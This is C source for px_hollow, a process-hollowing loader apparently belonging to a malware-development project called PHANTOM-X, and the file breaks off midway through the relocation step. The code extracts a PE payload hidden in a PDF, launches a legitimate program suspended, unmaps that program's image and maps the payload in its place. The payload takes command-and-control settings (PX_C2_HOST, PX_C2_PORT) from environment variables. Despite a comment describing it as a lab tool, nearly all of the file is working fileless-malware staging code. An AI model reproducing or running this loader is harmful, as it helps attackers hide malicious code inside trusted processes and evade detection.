/*
 * PHANTOM-X :: phase3_fileless/loader/px_hollow.c
 * =============================================================================
 * px_hollow.exe -- extract a PE from a PDF and run it inside another process.
 *
 * WHAT IT DOES
 *   1. Parses the carrier PDF and extracts the embedded PE IN MEMORY.
 *      (Nothing is written to disk.)
 *   2. Creates the target program SUSPENDED.
 *   3. Reads the target's PEB to find its image base and loaded modules.
 *   4. Unmaps the target's original image from its address space.
 *   5. Maps the payload image into the target's address space:
 *      headers, sections, base relocations.
 *   6. Resolves the payload's imports INSIDE THE TARGET by RVA arithmetic:
 *      for each imported function, the offset within its DLL is computed in
 *      this process, then added to the target's own base for that DLL.
 *      This works because both processes load the same DLL files from the
 *      same boot, so a function sits at the same offset in both.
 *   7. Repoints the suspended thread's instruction pointer at the payload's
 *      entry point and resumes it.
 *
 *   The payload now runs as the target process. From the OS's point of view
 *   there is no second process: the target's own image was replaced.
 *
 * SCOPE AND DELIBERATE OMISSIONS
 *   A laboratory instrument for a personally owned, isolated Windows VM.
 *   Deliberately PLAIN:
 *     * No obfuscation, packing, or anti-analysis.
 *     * No AMSI bypass, no ETW unhooking, no syscall stubs.
 *     * No kernel component. Everything here is ordinary user-mode code.
 *     * No unlinking from the process list, no PEB unlinking, no DKOM.
 *   The technique is the point; concealment of the technique from the
 *   analyst is NOT, because the whole exercise is to observe what a
 *   defender can and cannot see. A hollow that is also invisible would
 *   produce no measurable signal.
 *
 *   It only ever hollows a process it starts itself. It never attaches to
 *   or modifies a process belonging to anyone else.
 *
 * WHY THE PAYLOAD IMPORTS ONLY KERNEL32
 *   Import resolution in a remote process requires the DLL to already be
 *   loaded there. Every Windows process has kernel32.dll; most do not have
 *   ws2_32.dll. So the payload resolves Winsock at runtime and its static
 *   import table contains kernel32 alone.
 *
 * BUILD (MinGW x64):
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o px_hollow.exe px_hollow.c \
 *       /usr/x86_64-w64-mingw32/lib/libz.a -lws2_32
 *
 * USAGE
 *   px_hollow.exe <target.exe> <carrier.pdf>
 * Environment (inherited by the hollowed process):
 *   PX_C2_HOST, PX_C2_PORT
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdarg.h>
#include <zlib.h>

/* ================================================================== */
/* logging                                                            */
/* ================================================================== */
static void plog(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    fflush(stdout);
}

/* ================================================================== */
/* small helpers                                                      */
/* ================================================================== */
static const BYTE *pmemmem(const BYTE *hay, size_t hay_len,
                           const void *needle, size_t nlen)
{
    if (!nlen || hay_len < nlen)
        return NULL;
    for (size_t i = 0; i + nlen <= hay_len; i++) {
        if (hay[i] == ((const BYTE *)needle)[0] &&
            memcmp(hay + i, needle, nlen) == 0)
            return hay + i;
    }
    return NULL;
}

static long find_token(const BYTE *hay, size_t hay_len, const char *needle,
                       size_t from)
{
    size_t nlen = strlen(needle);
    if (!nlen || hay_len < nlen)
        return -1;
    for (size_t i = from; i + nlen <= hay_len; i++) {
        if (hay[i] == (BYTE)needle[0] && memcmp(hay + i, needle, nlen) == 0)
            return (long)i;
    }
    return -1;
}

static int ieq(const char *a, const char *b)
{
    while (*a && *b) {
        if (tolower((unsigned char)*a) != tolower((unsigned char)*b))
            return 0;
        a++;
        b++;
    }
    return *a == *b;
}

/* ================================================================== */
/* PDF embedded file extraction (same logic as px_loader)              */
/* ================================================================== */
static long dict_start_for_stream(const BYTE *pdf, size_t len, size_t stream_pos)
{
    long closes = 0;
    size_t i = stream_pos;
    (void)len;
    while (i >= 2) {
        if (pdf[i - 1] == '>' && pdf[i] == '>') { closes++; i -= 2; continue; }
        if (pdf[i - 1] == '<' && pdf[i] == '<') {
            if (closes == 0) { i -= 2; continue; }
            if (closes == 1) return (long)(i - 1);
            closes--; i -= 2; continue;
        }
        i--;
    }
    return -1;
}

static long dict_end_from_start(const BYTE *pdf, size_t len, size_t ds)
{
    long depth = 0;
    size_t i = ds;
    while (i + 1 < len) {
        if (pdf[i] == '<' && pdf[i + 1] == '<') { depth++; i += 2; continue; }
        if (pdf[i] == '>' && pdf[i + 1] == '>') {
            depth--; i += 2;
            if (depth == 0) return (long)i;
            continue;
        }
        i++;
    }
    return -1;
}

static long dict_length_value(const BYTE *pdf, size_t pdf_len,
                               const BYTE *dict, size_t dict_len, int depth)
{
    static const char key[] = "/Length";
    size_t klen = sizeof(key) - 1;
    for (size_t i = 0; i + klen <= dict_len; i++) {
        if (memcmp(dict + i, key, klen) != 0)
            continue;
        size_t j = i + klen;
        while (j < dict_len && (dict[j] == ' ' || dict[j] == '\r' ||
                                dict[j] == '\n' || dict[j] == '\t'))
            j++;
        if (j >= dict_len || !isdigit((unsigned char)dict[j]))
            continue;
        long first = strtol((const char *)dict + j, NULL, 10);
        size_t k = j;
        while (k < dict_len && isdigit((unsigned char)dict[k])) k++;
        while (k < dict_len && (dict[k] == ' ' || dict[k] == '\r' ||
                                dict[k] == '\n' || dict[k] == '\t'))
            k++;
        if (k < dict_len && isdigit((unsigned char)dict[k])) {
            size_t m = k;
            while (m < dict_len && isdigit((unsigned char)dict[m])) m++;
            while (m < dict_len && (dict[m] == ' ' || dict[m] == '\r' ||
                                    dict[m] == '\n' || dict[m] == '\t'))
                m++;
            if (m < dict_len && dict[m] == 'R') {
                if (depth > 3) return -1;
                char pat[64];
                snprintf(pat, sizeof(pat), "%ld 0 obj", first);
                long opos = find_token(pdf, pdf_len, pat, 0);
                if (opos < 0) return -1;
                long eop = find_token(pdf, pdf_len, "endobj", (size_t)opos);
                if (eop < 0) return -1;
                return dict_length_value(pdf, pdf_len, pdf + opos,
                                         (size_t)(eop - opos), depth + 1);
            }
        }
        return first;
    }
    return -1;
}

static BYTE *inflate_buffer(const BYTE *in, size_t in_len, size_t hint,
                             size_t *out_len)
{
    z_stream zs;
    size_t cap = hint ? hint : (in_len * 4 + 1024);
    BYTE *out = (BYTE *)malloc(cap);
    if (!out) return NULL;
    memset(&zs, 0, sizeof(zs));
    if (inflateInit(&zs) != Z_OK) { free(out); return NULL; }
    zs.next_in = (Bytef *)in;
    zs.avail_in = (uInt)in_len;
    for (;;) {
        int rc;
        zs.next_out = out + zs.total_out;
        zs.avail_out = (uInt)(cap - zs.total_out);
        rc = inflate(&zs, Z_NO_FLUSH);
        if (rc == Z_STREAM_END) break;
        if (rc != Z_OK && rc != Z_BUF_ERROR) {
            inflateEnd(&zs); free(out); return NULL;
        }
        if (zs.avail_out == 0) {
            size_t ncap = cap * 2;
            BYTE *nb = (BYTE *)realloc(out, ncap);
            if (!nb) { inflateEnd(&zs); free(out); return NULL; }
            out = nb; cap = ncap;
        } else if (rc == Z_BUF_ERROR) {
            inflateEnd(&zs); free(out); return NULL;
        }
    }
    *out_len = zs.total_out;
    inflateEnd(&zs);
    return out;
}

static BYTE *extract_embedded_file(const BYTE *pdf, size_t pdf_len,
                                   size_t *out_len)
{
    size_t pos = 0;
    while (pos < pdf_len) {
        long sp = find_token(pdf, pdf_len, "stream", pos);
        long ds, de;
        size_t data_start, raw_len;
        long length;
        BYTE *raw, *dec;
        size_t dec_len = 0;
        int filtered = 0;

        if (sp < 0) break;
        ds = dict_start_for_stream(pdf, pdf_len, (size_t)sp);
        if (ds < 0) { pos = (size_t)sp + 6; continue; }
        de = dict_end_from_start(pdf, pdf_len, (size_t)ds);
        if (de < 0) { pos = (size_t)sp + 6; continue; }
        size_t dlen = (size_t)de - (size_t)ds;

        if (dlen < 14 || !pmemmem(pdf + ds, dlen, "/EmbeddedFile", 13)) {
            pos = (size_t)sp + 6;
            continue;
        }

        data_start = (size_t)sp + 6;
        if (data_start + 1 < pdf_len && pdf[data_start] == '\r') data_start++;
        if (data_start < pdf_len && pdf[data_start] == '\n') data_start++;

        length = dict_length_value(pdf, pdf_len, pdf + ds, dlen, 0);
        if (length <= 0 || (size_t)length > pdf_len - data_start) {
            long ep = find_token(pdf, pdf_len, "endstream", data_start);
            if (ep < 0) break;
            raw_len = (size_t)ep - data_start;
            while (raw_len && (pdf[data_start + raw_len - 1] == '\n' ||
                               pdf[data_start + raw_len - 1] == '\r'))
                raw_len--;
        } else {
            raw_len = (size_t)length;
        }

        raw = (BYTE *)malloc(raw_len ? raw_len : 1);
        if (!raw) return NULL;
        memcpy(raw, pdf + data_start, raw_len);

        if (pmemmem(pdf + ds, dlen, "/FlateDecode", 12))
            filtered = 1;

        if (filtered) {
            dec = inflate_buffer(raw, raw_len, raw_len * 3 + 1024, &dec_len);
            free(raw);
            if (!dec) return NULL;
        } else {
            dec = raw;
            dec_len = raw_len;
        }
        plog("[hollow] extracted %lu bytes (%s)\n", (unsigned long)dec_len,
             filtered ? "inflated" : "raw");
        *out_len = dec_len;
        return dec;
    }
    return NULL;
}

/* ================================================================== */
/* remote process helpers                                             */
/* ================================================================== */
/* PROCESS_BASIC_INFORMATION is not exposed by the mingw public headers.
 * Define it locally; the layout is stable and documented in winnt.h on
 * Windows (it is the same structure the SDK declares as
 * PROCESS_BASIC_INFORMATION). */
typedef struct _PX_PROCESS_BASIC_INFORMATION {
    LONG ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityQuota;
    ULONG_PTR BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PX_PROCESS_BASIC_INFORMATION;

typedef LONG (NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *fn_NtQueryInformationProcess)(HANDLE, DWORD, PVOID,
                                                    ULONG, PULONG);

static BOOL wpm(HANDLE h, void *addr, const void *data, size_t len)
{
    SIZE_T wrote = 0;
    return WriteProcessMemory(h, addr, data, len, &wrote) && wrote == len;
}

static BOOL rpm(HANDLE h, void *addr, void *data, size_t len)
{
    SIZE_T got = 0;
    return ReadProcessMemory(h, addr, data, len, &got) && got == len;
}

/*
 * Read a module's name out of an LDR_DATA_TABLE_ENTRY.
 *
 * Two layouts exist in the wild and they are not interchangeable:
 *
 *   Windows x64 : BaseDllName at +0x50 is a POINTER to a UNICODE_STRING.
 *                 Length is at +0 of that structure, the buffer at +8.
 *   Wine        : FullDllName/BaseDllName are stored INLINE. For the base
 *                 name the Length field is at +0x58 and the buffer pointer
 *                 at +0x60.
 *
 * Both are tried and the result is validated by reading the string back and
 * requiring it to look like a module name. Guessing one layout and hoping
 * the host matches it is how this tool spent its first afternoon.
 */
static int read_module_name(HANDLE h, unsigned long long entry,
                            char *out, int outsz)
{
    BYTE buf[0x70];
    unsigned short lenInline = 0, lenPtr = 0;
    unsigned long long bufInline = 0, usPtr = 0, bufPtr = 0;

    memset(buf, 0, sizeof(buf));
    if (!rpm(h, (void *)entry, buf, sizeof(buf)))
        return 0;

    /* candidate A -- inline UNICODE_STRING */
    memcpy(&lenInline, buf + 0x58, 2);
    memcpy(&bufInline, buf + 0x60, 8);
    if (lenInline && lenInline < 260 && bufInline) {
        char tmp[264];
        memset(tmp, 0, sizeof(tmp));
        if (rpm(h, (void *)bufInline, tmp, lenInline)) {
            int printable = 1;
            for (int i = 0; i < lenInline; i++) {
                if (tmp[i] < 0x20 || tmp[i] > 0x7E) { printable = 0; break; }
            }
            if (printable && strchr(tmp, '.')) {
                memcpy(out, tmp, (size_t)(outsz - 1));
                out[outsz - 1] = '\0';
                return 1;
            }
        }
    }

    /* candidate B -- pointer to a UNICODE_STRING */
    memcpy(&usPtr, buf + 0x50, 8);
    if (usPtr) {
        if (rpm(h, (void *)usPtr, &lenPtr, 2) && lenPtr && lenPtr < 260 &&
            rpm(h, (void *)(usPtr + 8), &bufPtr, 8) && bufPtr) {
            char tmp[264];
            memset(tmp, 0, sizeof(tmp));
            if (rpm(h, (void *)bufPtr, tmp, lenPtr)) {
                int printable = 1;
                for (int i = 0; i < lenPtr; i++) {
                    if (tmp[i] < 0x20 || tmp[i] > 0x7E) { printable = 0; break; }
                }
                if (printable && strchr(tmp, '.')) {
                    memcpy(out, tmp, (size_t)(outsz - 1));
                    out[outsz - 1] = '\0';
                    return 1;
                }
            }
        }
    }
    return 0;
}

/* Enumerate the target's loaded modules by walking the PEB loader list.
 * Returns the number found. dllNames/dllBases may be NULL to just count. */
static int enum_target_modules(HANDLE h, void *peb,
                               char dllNames[][64], unsigned long long *dllBases,
                               int max)
{
    unsigned long long ldr = 0, listHead = 0, entry = 0, flink = 0;
    int count = 0;

    if (!rpm(h, (void *)((BYTE *)peb + 0x18), &ldr, 8)) {
        plog("[hollow]   cannot read PEB->Ldr at %p\n",
             (void *)((BYTE *)peb + 0x18));
        return -1;
    }
    listHead = ldr + 0x20;      /* LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList */
    entry = listHead;
    plog("[hollow]   peb=%p ldr=0x%llx listHead=0x%llx\n",
         peb, ldr, listHead);

    for (int guard = 0; guard < 512; guard++) {
        if (!rpm(h, (void *)entry, &flink, 8)) {
            plog("[hollow]   list read failed at entry 0x%llx (iteration %d)\n",
                 entry, guard);
            break;
        }
        if (flink == listHead) {
            plog("[hollow]   list end reached after %d module(s)\n", count);
            break;
        }
        if (flink == 0) {
            /* Some hosts terminate the chain with a NULL pointer rather
             * than linking back to the list head. */
            plog("[hollow]   list terminated with NULL after %d module(s)\n",
                 count);
            break;
        }
        entry = flink - 0x10;   /* InMemoryOrderLinks is at offset 0x10 */

        {
            unsigned long long base = 0;
            char nm[64];

            if (!rpm(h, (void *)(entry + 0x30), &base, 8)) {
                plog("[hollow]   read DllBase failed at entry 0x%llx\n", entry);
                break;
            }
            if (dllNames && count < max) {
                if (read_module_name(h, entry, nm, sizeof(nm))) {
                    memcpy(dllNames[count], nm, 63);
                    dllNames[count][63] = '\0';
                } else {
                    dllNames[count][0] = '\0';
                }
            }
            if (dllBases && count < max)
                dllBases[count] = base;
        }
        count++;
        if (count >= max && dllNames)
            break;
    }
    return count;
}

/* ================================================================== */
/* PE mapping into a remote process                                   */
/* ================================================================== */
#ifdef _WIN64
typedef IMAGE_THUNK_DATA64 PX_THUNK;
#define PX_ORD64 0x8000000000000000ULL
#else
typedef IMAGE_THUNK_DATA32 PX_THUNK;
#define PX_ORD64 0x80000000U
#endif

static int apply_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, ULONGLONG delta)
{
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION *rel;
    DWORD rva = 0, applied = 0;

    if (!dd->VirtualAddress || !dd->Size || !delta)
        return 0;
    rel = (IMAGE_BASE_RELOCATION *)(base + dd->VirtualAddress);
    while (rva < dd->Size) {
        DWORD va = rel->VirtualAddress, size = rel->SizeOfBlock;
        WORD *entries;
        if (size < sizeof(IMAGE_BASE_RELOCATION)) break;
        entries = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < (size - sizeof(IMAGE_BASE_RELOCATION)) / 2; i++) {
            WORD e = entries[i];
            WORD type = (WORD)(e >> 12), off = (WORD)(e & 0x0FFF);
            if (!off) continue;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG *p = (ULONGLONG *)(base + va + off);
                *p += delta;
                applied++;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD *p = (DWORD *)(base + va + off);
                *p += (DWORD)delta;
                applied++;
            }
        }
        rva += size;
        rel = (IMAGE_BASE_RELOCATION *)((BYTE *)rel + size);
    }
    return (int)applied;
}

/*
 * Resolve the payload's imports inside the TARGET process.
 *
 * For each imported function we compute its offset within its DLL in THIS
 * process, then add the target's base for that same DLL. Both processes
 * map the same file from the same boot, so the offset is identical.
 */
/* Implementation with the PEB supplied by the caller. */
/* Convert an RVA into a file offset within the raw PE buffer.
 *
 * In a mapped image an RVA is the offset from the image base. In the RAW
 * FILE the same data lives at PointerToRawData, which is a completely
 * different number. Reading a file buffer at an RVA silently returns the
 * wrong bytes -- there is no fault, just nonsense -- so every local read of
 * PE metadata has to go through here. */
static DWORD rva_to_raw(IMAGE_NT_HEADERS *nt, DWORD rva)
{
    IMAGE_SECTION_HEADER *sec;
    if (!nt)
        return rva;
    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD va = sec->VirtualAddress;
        DWORD vs = sec->Misc.VirtualSize;
        if (vs == 0)
            vs = sec->SizeOfRawData;
        if (rva >= va && rva < va + vs)
            return sec->PointerToRawData + (rva - va);
    }
    return rva;   /* inside the headers, where RVA == file offset */
}

static int resolve_imports_remote_p(HANDLE hproc, void *peb,
                                     BYTE *local_pe, ULONGLONG remote_base,
                                     IMAGE_NT_HEADERS *nt_local)
{
    IMAGE_DATA_DIRECTORY *dd =
        &nt_local->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR *desc;
    static char names[128][64];
    static unsigned long long bases[128];
    int nmods, resolved = 0;

    if (!dd->VirtualAddress || !dd->Size)
        return 0;

    nmods = enum_target_modules(hproc, peb, names, bases, 128);
    plog("[hollow] target has %d loaded module(s)\n", nmods);

    desc = (IMAGE_IMPORT_DESCRIPTOR *)(local_pe +
                                       rva_to_raw(nt_local, dd->VirtualAddress));
    for (; desc->Name; desc++) {
        const char *dllname = (const char *)(local_pe +
                                             rva_to_raw(nt_local, desc->Name));
        unsigned long long targetDllBase = 0;
        HMODULE localDll = NULL;

        plog("[hollow]   desc: name_rva=0x%x oft=0x%x ft=0x%x  dll='%s'\n",
             desc->Name, desc->OriginalFirstThunk, desc->FirstThunk, dllname);

        for (int i = 0; i < nmods; i++) {
            if (ieq(names[i], dllname)) { targetDllBase = bases[i]; break; }
        }
        if (!targetDllBase) {
            /*
             * Fallback: the target's loader list did not contain this DLL.
             *
             * On Windows, system DLLs are mapped at the SAME address in
             * every process within a boot session -- the ASLR rebase
             * happens once per boot, not once per process. So the base this
             * process sees for a system DLL is also the base the target
             * sees, and the RVA arithmetic below still lands on the right
             * function.
             *
             * This path also keeps the tool usable on hosts whose loader
             * list emulation is incomplete (Wine exposes only a partial
             * list for a process suspended before its loader finished).
             */
            HMODULE shared = GetModuleHandleA(dllname);
            if (shared) {
                targetDllBase = (unsigned long long)shared;
                plog("[hollow]   %s absent from the target's list; using the "
                     "shared boot base 0x%llx\n", dllname, targetDllBase);
            }
        }
        if (!targetDllBase) {
            plog("[hollow]   !! %s is NOT loaded in the target\n", dllname);
            continue;
        }
        localDll = GetModuleHandleA(dllname);
        if (!localDll) {
            localDll = LoadLibraryA(dllname);
            if (!localDll) {
                plog("[hollow]   !! LoadLibrary %s failed locally\n", dllname);
                continue;
            }
        }

        {
            PX_THUNK *thunk = (PX_THUNK *)(local_pe +
                                           rva_to_raw(nt_local, desc->FirstThunk));
            PX_THUNK *orig = desc->OriginalFirstThunk
                                 ? (PX_THUNK *)(local_pe +
                                                rva_to_raw(nt_local,
                                                           desc->OriginalFirstThunk))
                                 : thunk;
            unsigned long long remoteThunk = remote_base + desc->FirstThunk;
            for (;;) {
                FARPROC proc;
                ULONGLONG targetAddr;
                if (!orig->u1.Function)
                    break;
                if (orig->u1.Function & PX_ORD64) {
                    proc = GetProcAddress(localDll,
                                          (LPSTR)(orig->u1.Function & 0xFFFF));
                    if (!proc) break;
                    targetAddr = targetDllBase +
                                 (ULONGLONG)((BYTE *)proc - (BYTE *)localDll);
                } else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)(local_pe +
                                                 rva_to_raw(nt_local,
                                                            orig->u1.AddressOfData));
                    proc = GetProcAddress(localDll, (LPCSTR)ibn->Name);
                    if (!proc) {
                        plog("[hollow]   !! %s!%s not found locally\n",
                             dllname, ibn->Name);
                        break;
                    }
                    targetAddr = targetDllBase +
                                 (ULONGLONG)((BYTE *)proc - (BYTE *)localDll);
                }
                /* write the resolved address into the TARGET's IAT */
                if (!wpm(hproc, (void *)(ULONG_PTR)remoteThunk, &targetAddr,
                         sizeof(targetAddr)))
                    break;
                remoteThunk += sizeof(ULONGLONG);
                thunk++;
                orig++;
                resolved++;
            }
        }
    }
    return resolved;
}

/* Ensure the target's loader list is populated.
 *
 * On real Windows the loader data structures are built during CreateProcess,
 * so PEB->Ldr is already valid for a process created with CREATE_SUSPENDED.
 *
 * Some hosts -- Wine in particular -- do not populate PEB->Ldr until the
 * initial thread actually begins executing, so a suspended process has a
 * null Ldr pointer. Detect that and fall back to letting the thread start
 * for a moment and suspending it again, which forces loader
 * initialisation on either kind of host.
 *
 * Returns 1 if PEB->Ldr is usable, 0 otherwise. */
static int ensure_loader_list(HANDLE hproc, HANDLE hthread, void **pebOut)
{
    void *peb = *pebOut;
    unsigned long long ldr = 0;

    if (rpm(hproc, (void *)((BYTE *)peb + 0x18), &ldr, 8) && ldr) {
        return 1;
    }

    plog("[hollow]   PEB->Ldr is null; letting the thread initialise the "
         "loader...\n");
    if (ResumeThread(hthread) == (DWORD)-1)
        return 0;
    Sleep(1500);
    if (SuspendThread(hthread) == (DWORD)-1)
        return 0;

    if (!rpm(hproc, (void *)((BYTE *)peb + 0x18), &ldr, 8) || !ldr) {
        plog("[hollow]   still no loader list\n");
        return 0;
    }
    plog("[hollow]   loader list now available (ldr=0x%llx)\n", ldr);
    return 1;
}

/* ================================================================== */
/* main                                                               */
/* ================================================================== */
int main(int argc, char **argv)
{
    const char *target_path = (argc > 1) ? argv[1] : "C:\\Windows\\System32\\notepad.exe";
    const char *pdf_path = (argc > 2) ? argv[2] : NULL;

    FILE *f;
    long fsz;
    BYTE *pdf = NULL, *payload = NULL;
    size_t pdf_len = 0, payload_len = 0;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    BYTE *mapped;
    DWORD imageBase, sizeOfImage, sizeOfHeaders;
    LONG st;
    IMAGE_SECTION_HEADER *sec;
    WORD i;
    HMODULE ntdll;
    fn_NtUnmapViewOfSection pUnmap;
    fn_NtQueryInformationProcess pQuery;
    PX_PROCESS_BASIC_INFORMATION pbi;
    void *peb;
    ULONGLONG originalBase;
    ULONGLONG targetBase = 0;
    BOOL ok;

    if (!pdf_path) {
        printf("usage: px_hollow.exe <target.exe> <carrier.pdf>\n");
        printf("  target : program to hollow (must be a program YOU launch)\n");
        printf("  carrier: PDF containing the embedded payload PE\n");
        return 1;
    }

    f = fopen(pdf_path, "rb");
    if (!f) { plog("[hollow] cannot open %s\n", pdf_path); return 2; }
    fseek(f, 0, SEEK_END); fsz = ftell(f); fseek(f, 0, SEEK_SET);
    pdf = (BYTE *)malloc((size_t)fsz);
    if (!pdf || fread(pdf, 1, (size_t)fsz, f) != (size_t)fsz) {
        plog("[hollow] cannot read %s\n", pdf_path); return 2;
    }
    fclose(f);
    pdf_len = (size_t)fsz;
    plog("[hollow] carrier pdf %lu bytes\n", (unsigned long)pdf_len);

    payload = extract_embedded_file(pdf, pdf_len, &payload_len);
    free(pdf);
    if (!payload) { plog("[hollow] no embedded file\n"); return 3; }

    /* --- parse the payload ------------------------------------------------ */
    dos = (IMAGE_DOS_HEADER *)payload;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        plog("[hollow] payload is not a PE\n"); return 4;
    }
    nt = (IMAGE_NT_HEADERS *)(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        plog("[hollow] payload NT signature bad\n"); return 4;
    }
    imageBase = nt->OptionalHeader.ImageBase;
    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    plog("[hollow] payload imagebase=0x%08x sizeofimage=0x%x entry=0x%x\n",
         imageBase, sizeOfImage, nt->OptionalHeader.AddressOfEntryPoint);

    /* --- create the target suspended -------------------------------------- */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    {
        wchar_t wtarget[MAX_PATH], wcmd[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, target_path, -1, wtarget, MAX_PATH);
        _snwprintf(wcmd, MAX_PATH, L"\"%s\"", wtarget);
        ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        if (!ok) {
            plog("[hollow] CreateProcess failed (%lu)\n",
                 (unsigned long)GetLastError());
            return 5;
        }
    }
    plog("[hollow] target pid=%lu created suspended\n",
         (unsigned long)pi.dwProcessId);

    /* --- read the target's PEB -------------------------------------------- */
    ntdll = GetModuleHandleA("ntdll.dll");
    pUnmap = (fn_NtUnmapViewOfSection)(void *)GetProcAddress(
        ntdll, "NtUnmapViewOfSection");
    pQuery = (fn_NtQueryInformationProcess)(void *)GetProcAddress(
        ntdll, "NtQueryInformationProcess");
    if (!pUnmap || !pQuery) {
        plog("[hollow] ntdll exports missing\n"); return 6;
    }
    memset(&pbi, 0, sizeof(pbi));
    {
        ULONG ret = 0;
        LONG st = pQuery(pi.hProcess, 0 /*ProcessBasicInformation*/,
                         &pbi, sizeof(pbi), &ret);
        if (st < 0) { plog("[hollow] NtQueryInformationProcess failed\n"); return 6; }
    }
    peb = pbi.PebBaseAddress;
    originalBase = 0;
    rpm(pi.hProcess, (BYTE *)peb + 0x10, &originalBase, 8);
    plog("[hollow] target peb=%p original imagebase=0x%llx\n",
         peb, originalBase);

    if (!ensure_loader_list(pi.hProcess, pi.hThread, &peb)) {
        plog("[hollow] cannot obtain the target's loader list; aborting\n");
        return 6;
    }

    /* --- unmap the original image ----------------------------------------- */
    st = pUnmap(pi.hProcess, (void *)(ULONG_PTR)originalBase);
    plog("[hollow] NtUnmapViewOfSection -> 0x%lx\n", (unsigned long)st);

    /* --- map the payload into the target ---------------------------------- */
    /* Diagnose what the target's address space actually looks like before
     * we touch it. Two addresses matter: the PEB's ImageBaseAddress and the
     * payload's preferred base. If the target is already living at the
     * payload's preferred base, mapping there would overwrite it. */
    {
        MEMORY_BASIC_INFORMATION mbi;
        unsigned long long probes[3];
        const char *labels[3] = { "PEB ImageBaseAddress", "payload ImageBase",
                                  "payload entry RVA" };
        probes[0] = originalBase;
        probes[1] = imageBase;
        probes[2] = imageBase + nt->OptionalHeader.AddressOfEntryPoint;
        for (int probe = 0; probe < 3; probe++) {
            if (VirtualQueryEx(pi.hProcess,
                               (LPCVOID)(ULONG_PTR)probes[probe], &mbi,
                               sizeof(mbi))) {
                plog("[hollow]   target @0x%llx (%-20s) base=0x%llx "
                     "alloc=0x%llx size=0x%llx state=0x%lx protect=0x%lx "
                     "type=0x%lx\n",
                     probes[probe], labels[probe],
                     (unsigned long long)(ULONG_PTR)mbi.BaseAddress,
                     (unsigned long long)(ULONG_PTR)mbi.AllocationBase,
                     (unsigned long long)mbi.RegionSize,
                     (unsigned long)mbi.State, (unsigned long)mbi.Protect,
                     (unsigned long)mbi.Type);
            } else {
                plog("[hollow]   target @0x%llx (%s): not mapped\n",
                     probes[probe], labels[probe]);
            }
        }
    }

    mapped = (BYTE *)VirtualAllocEx(pi.hProcess, (LPVOID)(ULONG_PTR)imageBase,
                                    sizeOfImage, MEM_RESERVE | MEM_COMMIT,
                                    PAGE_EXECUTE_READWRITE);
    if (!mapped) {
        mapped = (BYTE *)VirtualAllocEx(pi.hProcess,
                                        (LPVOID)(ULONG_PTR)originalBase,
                                        sizeOfImage, MEM_RESERVE | MEM_COMMIT,
                                        PAGE_EXECUTE_READWRITE);
        if (!mapped) {
            plog("[hollow] VirtualAllocEx failed (%lu)\n",
                 (unsigned long)GetLastError());
            return 7;
        }
    }
    targetBase = (ULONGLONG)(ULONG_PTR)mapped;
    plog("[hollow] payload mapped in target at 0x%llx\n", targetBase);

    if (sizeOfHeaders > payload_len) sizeOfHeaders = (DWORD)payload_len;
    if (!wpm(pi.hProcess, mapped, payload, sizeOfHeaders)) {
        plog("[hollow] header write failed\n"); return 7;
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD va = sec->VirtualAddress, vsize = sec->Misc.VirtualSize;
        DWORD rawsize = sec->SizeOfRawData, praw = sec->PointerToRawData;
        if (rawsize && praw && (size_t)praw + rawsize <= payload_len) {
            if (!wpm(pi.hProcess, mapped + va, payload + praw, rawsize)) {
                plog("[hollow] section %u write failed\n", i);
                return 7;
            }
        }
        if (vsize > rawsize) {
            static const BYTE zeros[4096] = { 0 };
            DWORD left = vsize - rawsize;
            DWORD off = rawsize;
            while (left) {
                DWORD chunk = left > sizeof(zeros) ? (DWORD)sizeof(zeros) : left;
                if (!wpm(pi.hProcess, mapped + va + off, zeros, chunk))
                    break;
                off += chunk;
                left -= chunk;
            }
        }
    }

    /* relocations, computed locally then written across */
    if (targetBase != imageBase) {
        BYTE *tmp = (BYTE *)malloc(sizeOfImage);
        int n;
        if (!tmp) return 8;
        memset(tmp, 0, sizeOfImage);
        memcpy(tmp, payload, sizeOfHeaders);
        sec = IMAGE_FIRST_SECTION(nt);
        for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (sec->SizeOfRawData && sec->PointerToRawData &&
                (size_t)sec->PointerToRawData + sec->SizeOfRawData <= payload_len)
                memcpy(tmp + sec->VirtualAddress, payload + sec->PointerToRawData,
                       sec->SizeOfRawData);
        }
        n = apply_relocs(tmp, nt, targetBase - imageBase);
        plog("[hollow] applied %d relocation(s) locally\n", n);
        /* write the relocated sections back */
        sec = IMAGE_FIRST_SECTION(nt);
